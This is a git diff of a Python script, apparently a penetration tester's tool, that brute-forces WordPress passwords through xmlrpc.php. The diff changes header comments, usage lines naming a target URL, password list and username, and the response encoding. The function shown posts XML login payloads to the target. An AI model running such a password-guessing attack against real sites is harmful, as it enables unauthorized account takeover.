@@ -1,15 +1,19 @@
-
 #!/usr/bin/python3
 
+# Author:   Kavish Gour
+# Date:     2019-10-10
+# Email: kavishgr@protonmail.com
+# Twitter:  https://twitter.com/kavishgour
+# Python || SecBSD || Penetration Tester 
 
 
 #######################################################################################################
 #                                         USAGE                                                       #
 #######################################################################################################
 
-# USAGE: python3 sliz.py http[s]://target.com/xmlrpc.php passwords.txt username     
-#        python3 sliz.py http[s]://target.com/wordpress/xmlrpc.php passwords.txt username
-#        python3 sliz.py http[s]://target.com/wp/xmlrpc.php passwords.txt username
+# USAGE: python3 xmlrpcbruteforce.py http[s]://target.com/xmlrpc.php passwords.txt username     
+#        python3 xmlrpcbruteforce.py http[s]://target.com/wordpress/xmlrpc.php passwords.txt username
+#        python3 xmlrpcbruteforce.py http[s]://target.com/wp/xmlrpc.php passwords.txt username
 
 #######################################################################################################
 #                                         IMPORTS                                                     #
@@ -86,6 +90,7 @@ def bruteforcing(url, user, passwords):
   data = prefix + payload + suffix 
   headers = {"Content-Type": "application/xml"}
   r = requests.post(url, data=data, headers=headers)
+  r.encoding = 'UTF-8'
   #print(r.text)
   return r.text
 
